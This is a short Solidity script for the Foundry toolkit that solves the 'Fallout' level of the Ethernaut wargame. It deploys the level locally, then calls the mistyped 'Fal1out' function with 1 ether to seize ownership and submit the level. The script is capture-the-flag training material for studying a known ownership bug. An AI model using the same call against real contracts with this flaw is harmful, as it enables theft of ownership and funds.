// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { Script, console2 } from 'forge-std/Script.sol';
import '../src/Fallout/FalloutFactory.sol';
import '../src/Ethernaut.sol';

contract FalloutScript is Script {
    Ethernaut ethernaut;

    function setUp() public { }

    function run() public {
        vm.startBroadcast();

        ethernaut = new Ethernaut();
        FalloutFactory FalloutFactory = new FalloutFactory();
        ethernaut.registerLevel(FalloutFactory);
        address levelAddress = ethernaut.createLevelInstance(FalloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        ethernautFallout.Fal1out{ value: 1 ether }();

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);

        vm.stopBroadcast();
    }
}
